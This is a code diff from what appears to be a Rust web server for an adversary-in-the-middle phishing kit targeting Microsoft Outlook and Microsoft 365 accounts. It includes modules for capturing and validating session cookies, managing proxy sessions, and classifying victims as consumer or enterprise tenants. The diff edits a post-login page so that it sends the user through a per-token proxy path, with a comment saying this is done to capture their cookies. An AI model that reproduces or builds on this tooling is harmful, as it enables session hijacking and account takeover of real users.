@@ -86,19 +86,19 @@ mod tenant_utils;
 use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
 
 mod proxy;
-use proxy::{proxy_handler, proxy_status_handler, proxy_health_check, proxy_test_page, ProxyConfig};
+use proxy::{proxy_handler, proxy_status_handler, ProxyConfig};
 
 mod cookie_capture;
-use cookie_capture::{cookie_report_handler, get_cookies_handler, delete_cookies_handler, get_cookie_stats_handler, validate_session_handler, CookieCapture};
+use cookie_capture::{cookie_report_handler, get_cookies_handler, delete_cookies_handler, get_cookie_stats_handler, validate_session_handler};
 
 mod proxy_session;
-use proxy_session::{create_proxy_session_handler, get_proxy_session_status_handler, kill_proxy_session_handler, get_proxy_session_url_handler, refresh_proxy_session_handler, list_active_sessions_handler, run_proxy_session_refresh_cycle};
+use proxy_session::{create_proxy_session_handler, get_proxy_session_status_handler, kill_proxy_session_handler, get_proxy_session_url_handler, refresh_proxy_session_handler, list_active_sessions_handler};
 
 mod proxy_security;
-use proxy_security::{SecurityConfig, add_security_headers, log_request, is_ip_allowed, generate_csrf_token};
 
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
+#[allow(dead_code)]
 pub struct AppConfig {
     client_id: String,
     client_secret: String,
@@ -475,45 +475,6 @@ fn decode_id_token(id_token: &str) -> Option<serde_json::Map<String, serde_json:
     value.as_object().cloned()
 }
 
-fn detect_tenant(email: &str, id_token_claims: Option<&serde_json::Map<String, serde_json::Value>>) -> (Option<String>, Option<String>) {
-    let parts: Vec<&str> = email.split('@').collect();
-    let domain = if parts.len() == 2 {
-        parts[1].to_lowercase()
-    } else {
-        String::new()
-    };
-
-    // First, try to detect from id_token claims (most accurate)
-    if let Some(claims) = id_token_claims {
-        // tid = "9188040d-6c67-4c5b-b112-36c304e66d61" is the Microsoft consumer tenant
-        if let Some(tid) = claims.get("tid").and_then(|v| v.as_str()) {
-            if tid == "9188040d-6c67-4c5b-b112-36c304e66d61" {
-                return (Some("consumer".to_string()), Some("consumer".to_string()));
-            } else {
-                return (Some(tid.to_string()), Some("enterprise".to_string()));
-            }
-        }
-    }
-
-    // Fallback to domain-based detection
-    if !domain.is_empty() {
-        let account_type = if domain.contains("onmicrosoft.com") || domain.contains("microsoft.com") || domain.contains("office365") || domain.contains("exchange") {
-            Some("enterprise".to_string())
-        } else if domain.contains("outlook.com") || domain.contains("hotmail.com") || domain.contains("live.com") || domain.contains("msn.com") {
-            Some("consumer".to_string())
-        } else {
-            Some("enterprise".to_string()) // Default to enterprise for custom domains
-        };
-        let tenant_id = if domain.contains("onmicrosoft.com") {
-            domain.split('.').next().map(|s| s.to_string())
-        } else {
-            Some(domain.clone())
-        };
-        return (tenant_id, account_type);
-    }
-    (None, Some("unknown".to_string()))
-}
-
 async fn exchange_code(
     query: web::Query<ExchangeQuery>,
     req: actix_web::HttpRequest,
@@ -696,13 +657,14 @@ async fn auth_success_handler(
         </div>
     </div>
     <script>
-        // Redirect to proxy after 3 seconds to capture cookies
+        // Redirect to proxy session URL after 3 seconds to capture cookies
+        // The /s/{token_id}/ path allows the proxy to associate cookies with this token
         setTimeout(function() {{
-            window.location.href = 'https://{}/owa/';
+            window.location.href = 'https://{}/s/{}/';
         }}, 3000);
     </script>
 </body>
-</html>"#, proxy_domain);
+</html>"#, proxy_domain, token_id);
 
     HttpResponse::Ok()
         .content_type("text/html; charset=utf-8")
